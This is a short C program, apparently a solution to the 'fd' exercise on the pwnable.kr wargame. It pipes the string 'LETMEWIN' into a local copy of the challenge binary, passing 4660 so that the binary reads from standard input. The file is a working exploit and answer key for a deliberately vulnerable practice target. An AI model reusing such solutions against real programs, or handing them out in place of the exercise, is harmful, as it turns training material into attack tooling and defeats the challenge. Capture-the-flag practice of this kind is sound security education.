/* File: yoda.c
 * Author: s0lst1c3
 * Description: Solution to 'fd' challenge at pwnable.kr
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/wait.h>

#define TARGET "/tmp/swagsauce/fd"

void error_handler(char *, int);
void child_proc(char **, int *);
void parent_proc(int *);

int main() {

	char* argv[3] = {

		"fd",
		"4660",
		NULL
	};

	int nydus_canal[2];
	if ( pipe( nydus_canal ) == -1 ) {
		error_handler("Unable to create pipe.\n", errno);
	}

	switch( fork() ) {
	case -1:
		error_handler("Unable to fork child process\n", errno);
	case 0:
		child_proc(argv, nydus_canal);
	default:
		parent_proc(nydus_canal);
	}

	return 0;
}

void error_handler(char *msg, int error_code) {

	perror(msg);
	if ( error_code != -1 ) {
		
		fprintf(stderr, "Errno: %d\n", error_code);
	}
	exit(1);
}

void child_proc(char **argv, int *nydus_canal) {

	// close write file descriptor of pipe
	close(nydus_canal[1]);

	// overwrite stdin with read file descriptor of pipe
	if ( dup2(nydus_canal[0], 0) == -1 ) {
		error_handler("dup2() failed\n", errno);
	}
	execve(TARGET, argv, NULL);
}

void parent_proc(int *nydus_canal) {

 	// close read file descriptor of pipe
	close(nydus_canal[0]);

	// write LETMEWIN\n 	to stdin of child process through pipe
	write(nydus_canal[1], "LETMEWIN\n", 9);

	// signal EOF by closing write file descriptor of pipe
	close(nydus_canal[1]);

	// wait for child process to finish
	wait(NULL);
}
